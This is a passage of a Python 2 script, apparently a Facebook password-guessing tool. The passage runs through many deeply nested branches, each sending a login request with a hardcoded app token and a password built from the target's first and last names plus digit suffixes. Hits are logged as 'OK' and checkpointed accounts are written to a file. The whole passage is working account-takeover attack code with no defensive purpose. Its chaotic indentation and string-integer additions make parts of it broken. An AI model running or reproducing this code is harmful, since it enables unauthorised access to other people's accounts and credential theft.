									                                                                                                                      		data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass12)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									                                                                                                                      		q = json.load(data)
									                                                                                                                     		if 'access_token' in q:
										                                                                                                                      		print '\x1b[1;96m[\x1b[1;92mOK\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass12 + ' - ' + b['name']
										                                                                                                                   		oks.append(user+pass12)
									                                                                                                                  		else:
										                                                                                                                      		if 'www.facebook.com' in q["error_msg"]:
											                                                                                                                		print '\x1b[1;96m[\x1b[1;93mCP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass12 + ' - ' + b['name']
											                                                                                                                 		cek = open("sg/ok_cp.txt", "a")
											                                                                                                                 		cek.write(user+"|"+pass12+"\n")
											                                                                                                                		cek.close()
											                                                                                                                 		cekpoint.append(user+pass12)
										                                                                                                                      		else:
 					                                                                                                                                                     	                        pass13 = b['last_name']+'1'
									                                                                                                                                 		data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass13)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									                                                                                                                                		q = json.load(data)
									                                                                                                                                   		if 'access_token' in q:
										                                                                                                                                     		print '\x1b[1;96m[\x1b[1;92mOK\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass13 + ' - ' + b['name']
										                                                                                                                                		oks.append(user+pass13)
									                                                                                                                                            	else:
										                                                                                                                                       		if 'www.facebook.com' in q["error_msg"]:
											                                                                                                                                       		print '\x1b[1;96m[\x1b[1;93mCP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass13 + ' - ' + b['name']
											                                                                                                                                      		cek = open("sg/ok_cp.txt", "a")
											                                                                                                                                  		cek.write(user+"|"+pass13+"\n")
											                                                                                                                                   		cek.close()
											                                                                                                                                        	cekpoint.append(user+pass13)
										                                                                                                                                             	else:
 											                                                                                                                                                pass14 = b['last_name']+'1'
															                                                                                                   		data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass14)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															                                                                                                  		q = json.load(data)
															                                                                                                       		if 'access_token' in q:
																                                                                                                  		print '\x1b[1;96m[\x1b[1;92mOK\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass14 + ' - ' + b['name']
																                                                                                                     		oks.append(user+pass14)
															                                                                                                    		else:
																                                                                                                 		if 'www.facebook.com' in q["error_msg"]:
																	                                                                                                      		print '\x1b[1;96m[\x1b[1;93mCP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass14 + ' - ' + b['name']
																	                                                                                                 		cek = open("sg/ok_cp.txt", "a")
																                                                                                                 			cek.write(user+"|"+pass14+"\n")
																	                                                                                                  		cek.close()
																                                                                                                     			cekpoint.append(user+pass14)
																                                                                                                    		else:
 											                                                                                                                                        	                pass15 = b['last_name']+'1'
															                                                                                                                   		data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass15)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															                                                                                                                   		q = json.load(data)
															                                                                                                                     		if 'access_token' in q:
																                                                                                                                 		print '\x1b[1;96m[\x1b[1;92mOK\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass15 + ' - ' + b['name']
																                                                                                                                     		oks.append(user+pass15)
															                                                                                                                     		else:
															                                                                                                                   			if 'www.facebook.com' in q["error_msg"]:
																	                                                                                                                   		print '\x1b[1;96m[\x1b[1;93mCP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass15 + ' - ' + b['name']
																	                                                                                                                    		cek = open("sg/ok_cp.txt", "a")
																	                                                                                                                   		cek.write(user+"|"+pass15+"\n")
																                                                                                                                  			cek.close()
																	                                                                                                                 		cekpoint.append(user+pass15)
																                                                                                                                      		else:
 											                                                                                                                                        	                                pass16 = b['last_name']+'1'
															                                                                                                                                        	data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass16)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															                                                                                                                                                q = json.load(data)
															                                                                                                                                        	if 'access_token' in q:
																                                                                                                                                       		print '\x1b[1;96m[\x1b[1;92mOK\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass16 + ' - ' + b['name']
															                                                                                                                                        		oks.append(user+pass16)
															                                                                                                                                        	else:
																                                                                                                                                        	if 'www.facebook.com' in q["error_msg"]:
																	                                                                                                                                       		print '\x1b[1;96m[\x1b[1;93mCP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass16 + ' - ' + b['name']
																	                                                                                                                                       		cek = open("sg/ok_cp.txt", "a")
																	                                                                                                                                       		cek.write(user+"|"+pass16+"\n")
																	                                                                                                                                        	cek.close()
																	                                                                                                                                        	cekpoint.append(user+pass16)
															                                                                                                                                        		else:
 											                                                                                                                                        	                                                pass17 = b['last_name'] + b['first_name']
															                                                                                                                                        	         	data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass17)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															                                                                                                                                                  		q = json.load(data)
															                                                                                                                                        	        	if 'access_token' in q:
															                                                                                                                                        		        	print '\x1b[1;96m[\x1b[1;92mOK\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass17 + ' - ' + b['name']
																                                                                                                                                        	        	oks.append(user+pass17)
															                                                                                                                                        	        	else:
																                                                                                                                                        	          	if 'www.facebook.com' in q["error_msg"]:
																	                                                                                                                                        	        	print '\x1b[1;96m[\x1b[1;93mCP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass17 + ' - ' + b['name']
																	                                                                                                                                        	        	cek = open("sg/ok_cp.txt", "a")
																	                                                                                                                                        	        	cek.write(user+"|"+pass17+"\n")
																	                                                                                                                                        	        	cek.close()
																                                                                                                                                        		         	cekpoint.append(user+pass17)
																                                                                                                                                        	           	else:
 																                                                                                                                                        		                pass18 = b['last_name'] + b['first_name']+1
																				                                                                                                              	         		data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass18)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																				                                                                                                     		         		q = json.load(data)
																				                                                                                                    		         		if 'access_token' in q:
																					                                                                                                      		         		print '\x1b[1;96m[\x1b[1;92mOK\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass18 + ' - ' + b['name']
																					                                                                                                		         		oks.append(user+pass18)
																				                                                                                                               	         		else:
																					                                                                                                  		         		if 'www.facebook.com' in q["error_msg"]:
																						                                                                                                  		         		print '\x1b[1;96m[\x1b[1;93mCP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass18 + ' - ' + b['name']
																						                                                                                                 		         		cek = open("sg/ok_cp.txt", "a")
																						                                                                                                   		         		cek.write(user+"|"+pass18+"\n")
																						                                                                                                   		         		cek.close()
																					                                                                                                            	         			cekpoint.append(user+pass18)
																				                                                                                                                              			else:
 																                                                                                                                                        		         	                pass19 = b['last_name'] + b['first_name']+12
																				                                                                                                                                        		data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass19)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																				                                                                                                                                           		q = json.load(data)
																				                                                                                                                                            		if 'access_token' in q:
																					                                                                                                                              	         		print '\x1b[1;96m[\x1b[1;92mOK\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass19 + ' - ' + b['name']
																				                                                                                                                                        			oks.append(user+pass19)
																				                                                                                                                                               		else:
																					                                                                                                                                          		if 'www.facebook.com' in q["error_msg"]:
																						                                                                                                                              	         		print '\x1b[1;96m[\x1b[1;93mCP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass19 + ' - ' + b['name']
																						                                                                                                                                        		cek = open("sg/ok_cp.txt", "a")
																						                                                                                                                                          		cek.write(user+"|"+pass19+"\n")
																						                                                                                                                                             		cek.close()
																					                                                                                                                                                		cekpoint.append(user+pass19)
																			                                                                                                                                        		       		else:
  																                                                                                                                                        		         	                                pass20 = b['last_name'] + b['first_name']+123
																		                                                                                                                                        		         			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass20)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																				                                                                                                                                        		         	q = json.load(data)
																				                                                                                                                                        		         	if 'access_token' in q:
																				                                                                                                                                        		         		print '\x1b[1;96m[\x1b[1;92mOK\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass20 + ' - ' + b['name']
																					                                                                                                                                        		         	oks.append(user+pass20)
																				                                                                                                                                        		         	else:
																					                                                                                                                                        		         	if 'www.facebook.com' in q["error_msg"]:
																						                                                                                                                                        		       		print '\x1b[1;96m[\x1b[1;93mCP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass20 + ' - ' + b['name']
																						                                                                                                                                        		         	cek = open("sg/ok_cp.txt", "a")
																						                                                                                                                                        		         	cek.write(user+"|"+pass20+"\n")
																						                                                                                                                                        		         	cek.close()
																						                                                                                                                                        		         	cekpoint.append(user+pass20)
																					                                                                                                                                        		                else:
  																					                                                                                                                                                                                pass21 = b['last_name'] + b['first_name']+1234
																									               	                                                                                                                		data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass21)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																									           	                                                                                                                		q = json.load(data)
																									        	                                                                                                                		if 'access_token' in q:
																									         	                                                                                                                			print '\x1b[1;96m[\x1b[1;92mOK\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass21 + ' - ' + b['name']
																									                                                                                                                                  			oks.append(user+pass21)
																									                                                                                                                                    		else:
																										          	                                                                                                                		if 'www.facebook.com' in q["error_msg"]:
																													                                                                                                                		print '\x1b[1;96m[\x1b[1;93mCP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass21 + ' - ' + b['name']
																											         	                                                                                                                		cek = open("sg/ok_cp.txt", "a")
																											         	                                                                                                                		cek.write(user+"|"+pass21+"\n")
																											          	                                                                                                                		cek.close()
																											           	                                                                                                                		cekpoint.append(user+pass21)
																										                                                                                                                                    		else:
  																					                                                                                                                                                                                      	        pass22 = b['last_name'] + b['first_name']+12345
																								                                                                                                                                                   			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass22)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																									                                                                                                                                                  		q = json.load(data)
																									                                                                                                                                                 		if 'access_token' in q:
																										                                                                                                                                                    		print '\x1b[1;96m[\x1b[1;92mOK\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass22 + ' - ' + b['name']
																										                                                                                                                                                       		oks.append(user+pass22)
																									                                                                                                                                                     		else:
																										                                                                                                                                                 		if 'www.facebook.com' in q["error_msg"]:
																											                                                                                                                                                 		print '\x1b[1;96m[\x1b[1;93mCP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass22 + ' - ' + b['name']
																											                                                                                                                                                     		cek = open("sg/ok_cp.txt", "a")
																											                                                                                                                                                     		cek.write(user+"|"+pass22+"\n")
																											                                                                                                                                                    		cek.close()
																										                                                                                                                                                      			cekpoint.append(user+pass22)
																									                                                                                                                                                       			else:
   																					                                                                                                                                                                                                   	        pass23 = b['last_name'] + b['first_name']+123456
																					                                                                                                                                                                						data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass23)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																									                                                                                                                                                                   		q = json.load(data)
																									                                                                                                                                                                       		if 'access_token' in q:
																										                                                                                                                                                                		print '\x1b[1;96m[\x1b[1;92mOK\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass23 + ' - ' + b['name']
																										                                                                                                                                                                  		oks.append(user+pass23)
																									                                                                                                                                                                       		else:
																										                                                                                                                                                                       		if 'www.facebook.com' in q["error_msg"]:
																											                                                                                                                                                                      		print '\x1b[1;96m[\x1b[1;93mCP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass23 + ' - ' + b['name']
																											                                                                                                                                                                    		cek = open("sg/ok_cp.txt", "a")
																											                                                                                                                                                                		cek.write(user+"|"+pass23+"\n")
																											                                                                                                                                                                    		cek.close()
																											                                                                                                                                                                    		cekpoint.append(user+pass23)
																										                                                                                                                                                                      		else:
  																					                                                                                                                                        		                                                 	                pass24 = b['last_name'] + b['first_name']+1234567
																									                                                                                                                                                                                      		data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass24)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																									                                                                                                                                                                                      		q = json.load(data)
																									                                                                                                                                                                                      		if 'access_token' in q:
																									                                                                                                                                                                                     			print '\x1b[1;96m[\x1b[1;92mOK\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass24 + ' - ' + b['name']
																										                                                                                                                                                                                		oks.append(user+pass24)
																									                                                                                                                                                                                     		else:
																										                                                                                                                                                                                     		if 'www.facebook.com' in q["error_msg"]:
																											                                                                                                                                                                                       		print '\x1b[1;96m[\x1b[1;93mCP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass24 + ' - ' + b['name']
																											                                                                                                                                                                                 		cek = open("sg/ok_cp.txt", "a")
																											                                                                                                                                                                                		cek.write(user+"|"+pass24+"\n")
																											                                                                                                                                                                                     		cek.close()
																											                                                                                                                                                                                 		cekpoint.append(user+pass24)
																										                                                                                                                                                                                       		else:
   																					                                                                                                                                        		                                                                                        pass25 = b['last_name'] + b['first_name']+12345678
																									                                                                                                                                                                                            	        	data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass25)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																									                                                                                                                                                                                             	        	q = json.load(data)
																									                                                                                                                                        	                                                       		if 'access_token' in q:
																										                                                                                                                                                                                                  		print '\x1b[1;96m[\x1b[1;92mOK\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass25 + ' - ' + b['name']
																										                                                                                                                                                                                            	        	oks.append(user+pass25)
																									                                                                                                                                        		                                                       	else:
																									                                                                                                                                        		                                             			if 'www.facebook.com' in q["error_msg"]:
																											                                                                                                                                        		                                               		print '\x1b[1;96m[\x1b[1;93mCP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass25 + ' - ' + b['name']
																											                                                                                                                                        		                                           		cek = open("sg/ok_cp.txt", "a")
																											                                                                                                                                        		                                             		cek.write(user+"|"+pass25+"\n")
																											                                                                                                                                                                                              	        	cek.close()
																											                                                                                                                                        		                                             		cekpoint.append(user+pass25)
																										                                                                                                                                        		                                                     	else:
 																					                                                                                                                                        		                                                                                              	        pass26 = b['first_name'] + b['last_name']
                                    																					                                                                                                                                        		                                                              	        data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass26)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
				    																					                                                                                                                                        		                                                             	        q = json.load(data)
																										                                                                                                                                        		                                                             	if 'access_token' in q:
																										                                                                                                                                        		                                                      	                print '\x1b[1;96m[\x1b[1;92mOK\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass26 + ' - ' + b['name']
																										                                                                                                                                        		                                                             	        oks.append(user+pass26)
																									                                                                                                                                        		                                                               		else:
																										                                                                                                                                        		                                                           		if 'www.facebook.com' in q["error_msg"]:
																										                                                                                                                                        		                                                            			print '\x1b[1;96m[\x1b[1;93mCP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass26 + ' - ' + b['name']
																											                                                                                                                                        		                                                         		cek = open("sg/ok_cp.txt", "a")
																											                                                                                                                                        		                                                          		cek.write(user+"|"+pass26+"\n")
																											                                                                                                                                        		                                                          		cek.close()
																											                                                                                                                                        		                                                            		cekpoint.append(user+pass26)
																									                                                                                                                                        		                                                             		        else:
 																					                                                                                                                                        		                                                                                                                        pass27 = b['first_name'] + b['last_name']+1
    																					                                                                                                                                        		                                                                                                                        data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass27)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
				    																					                                                                                                                                        		                                                                         	   	q = json.load(data)
																									                                                                                                                                        		                                                                           		if 'access_token' in q:
																									                                                                                                                                        		                                                                        			print '\x1b[1;96m[\x1b[1;92mOK\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass27 + ' - ' + b['name']
																										                                                                                                                                        		                                                                             		oks.append(user+pass27)
																									                                                                                                                                        		                                                                             		else:
																											                                                                                                                                        		                                                                          	if 'www.facebook.com' in q["error_msg"]:
																											                                                                                                                                        		                                                                          		print '\x1b[1;96m[\x1b[1;93mCP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass27 + ' - ' + b['name']
																											                                                                                                                                        		                                                                           		cek = open("sg/ok_cp.txt", "a")
																											                                                                                                                                        		                                                                          		cek.write(user+"|"+pass27+"\n")
																										                                                                                                                                        		                                                                          			cek.close()
																										                                                                                                                                        		                                                                         			cekpoint.append(user+pass27)
																										                                                                                                                                        		                                                                              	        else:
   																					                                                                                                                                        		                                                                                                                	                pass28 = b['first_name'] + b['last_name']+12
                                    																					                                                                                                                                        		                                                                                              	        data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass28)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
				   																					                                                                                                                                        		                                                                                            	    	q = json.load(data)
																									                                                                                                                                        		                                                                                           		if 'access_token' in q:
																										                                                                                                                                        		                                                                                        		print '\x1b[1;96m[\x1b[1;92mOK\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass28 + ' - ' + b['name']
																										                                                                                                                                        		                                                                                           		oks.append(user+pass28)
																									                                                                                                                                        		                                                                                               		else:
																										                                                                                                                                        		                                                                                                        if 'www.facebook.com' in q["error_msg"]:
																											                                                                                                                                        		                                                                                            		print '\x1b[1;96m[\x1b[1;93mCP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass28 + ' - ' + b['name']
																											                                                                                                                                        		                                                                                              		cek = open("sg/ok_cp.txt", "a")
																											                                                                                                                                        		                                                                                               		cek.write(user+"|"+pass28+"\n")
																											                                                                                                                                        		                                                                                           		cek.close()
																										                                                                                                                                        		                                                                                            			cekpoint.append(user+pass28)
																									                                                                                                                                        		                                                                                                                else:
  																					                                                                                                                                        		                                                                                                                	                                pass29 = b['first_name'] + b['last_name']+123
                                 																					                                                                                                                                        		                                                                                                                        data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass29)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																									                                                                                                                                        		                                                                                                                   	q = json.load(data)
																									                                                                                                                                        		                                                                                                                        if 'access_token' in q:
																										                                                                                                                                        		                                                                                                              		print '\x1b[1;96m[\x1b[1;92mOK\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass29 + ' - ' + b['name']
																									                                                                                                                                        		                                                                                                                         	oks.append(user+pass29)
																									                                                                                                                                        		                                                                                                                        else:
																										                                                                                                                                        		                                                                                                                        if 'www.facebook.com' in q["error_msg"]:
																											                                                                                                                                        		                                                                                                                	print '\x1b[1;96m[\x1b[1;93mCP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass29 + ' - ' + b['name']
																											                                                                                                                                        		                                                                                                                	cek = open("sg/ok_cp.txt", "a")
																											                                                                                                                                        		                                                                                                                	cek.write(user+"|"+pass29+"\n")
																											                                                                                                                                        		                                                                                                                	cek.close()
																										                                                                                                                                        		                                                                                                                		cekpoint.append(user+pass29)
																										                                                                                                                                        		                                                                                                                	else:
  																					                                                                                                                                        		                                                                                                                	                                                pass30 = b['first_name'] + b['last_name']+1234
                                   																					                                                                                                                                        		                                                                                                                	                data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass30)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																							                                                                                                                                        		                                                                                                                			          	q = json.load(data)
																									                                                                                                                                        		                                                                                                                		        if 'access_token' in q:
																										                                                                                                                                        		                                                                                                                		        print '\x1b[1;96m[\x1b[1;92mOK\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass30 + ' - ' + b['name']
																										                                                                                                                                        		                                                                                                                		        oks.append(user+pass30)
																									                                                                                                                                        		                                                                                                                		        else:
																										                                                                                                                                        		                                                                                                                		        if 'www.facebook.com' in q["error_msg"]:
																											                                                                                                                                        		                                                                                                                		        print '\x1b[1;96m[\x1b[1;93mCP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass30 + ' - ' + b['name']
																											                                                                                                                                        		                                                                                                                		        cek = open("sg/ok_cp.txt", "a")
																											                                                                                                                                        		                                                                                                                		        cek.write(user+"|"+pass30+"\n")
																											                                                                                                                                        		                                                                                                                		        cek.close()
																										                                                                                                                                        		                                                                                                                			        cekpoint.append(user+pass30)
																										                                                                                                                                        		                                                                                                                	                else:
  																					                                                                                                                                        		                                                                                                                	                                                                pass31 = b['first_name'] + b['last_name']+12345
                                  																					                                                                                                                                        		                                                                                                                	                       	        data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass31)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																									                                                                                                                                        		                                                                                                                	                           	q = json.load(data)
																									                                                                                                                                        		                                                                                                                	                       	       	if 'access_token' in q:
																										                                                                                                                                        		                                                                                                                                       	       		print '\x1b[1;96m[\x1b[1;92mOK\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass31 + ' - ' + b['name']
																										                                                                                                                                        		                                                                                                                	                       	       	oks.append(user+pass31)
																									                                                                                                                                        		                                                                                                                	                       	       	else:
																										                                                                                                                                        		                                                                                                                		                       	if 'www.facebook.com' in q["error_msg"]:
																										                                                                                                                                        		                                                                                                                		                       	       	print '\x1b[1;96m[\x1b[1;93mCP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass31 + ' - ' + b['name']
																											                                                                                                                                        		                                                                                                                	                       	       	cek = open("sg/ok_cp.txt", "a")
																											                                                                                                                                        		                                                                                                                	                       	       	cek.write(user+"|"+pass31+"\n")
																											                                                                                                                                        		                                                                                                                	                       	       	cek.close()
																											                                                                                                                                        		                                                                                                                                              	       	cekpoint.append(user+pass31)
					  																					                                                                                                                                        		                                                                                                                	                       	        else:
   																					                                                                                                                                        		                                                                                                                                       	                            	                                pass32 = b['first_name'] + b['last_name']+123456
                                  																					                                                                                                                                        		                                                                                                                	                        	                data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass32)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
				   																					                                                                                                                                        		                                                                                                                	                       	           	        q = json.load(data)
																									                                                                                                                                        		                                                                                                                	                       	                	if 'access_token' in q:
																										                                                                                                                                        		                                                                                                                		                                        print '\x1b[1;96m[\x1b[1;92mOK\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass32 + ' - ' + b['name']
																										                                                                                                                                        		                                                                                                                		                                        oks.append(user+pass32)
																									                                                                                                                                        		                                                                                                                	                                	        else:
																										                                                                                                                                        		                                                                                                                		                       	                if 'www.facebook.com' in q["error_msg"]:
																											                                                                                                                                        		                                                                                                                	                       	                   	print '\x1b[1;96m[\x1b[1;93mCP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass32 + ' - ' + b['name']
																										                                                                                                                                        		                                                                                                                		                       	                 	cek = open("sg/ok_cp.txt", "a")
																											                                                                                                                                        		                                                                                                                	                       	                 	cek.write(user+"|"+pass32+"\n")
																											                                                                                                                                        		                                                                                                                	                       	                 	cek.close()
																										                                                                                                                                        		                                                                                                                		                       	                 	cekpoint.append(user+pass32)
																									                                                                                                                                        		                                                                                                                		                          	                else:
 																					                                                                                                                                        		                                                                                                                	                        	                       	                              	        pass33 = b['first_name'] + b['last_name']+1234567
                                  																					                                                                                                                                        		                                                                                                                	                         	                                data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass33)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																									                                                                                                                                        		                                                                                                                	                           	          	                q = json.load(data)
																									                                                                                                                                        		                                                                                                                	                        	                            	if 'access_token' in q:
																										                                                                                                                                        		                                                                                                                	                        	                     	       	print '\x1b[1;96m[\x1b[1;92mOK\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass33 + ' - ' + b['name']
																											                                                                                                                                        		                                                                                                                               	                                	        oks.append(user+pass33)
																									                                                                                                                                        		                                                                                                                	                                   	                  	else:
																										                                                                                                                                        		                                                                                                                                                      	               	       		if 'www.facebook.com' in q["error_msg"]:
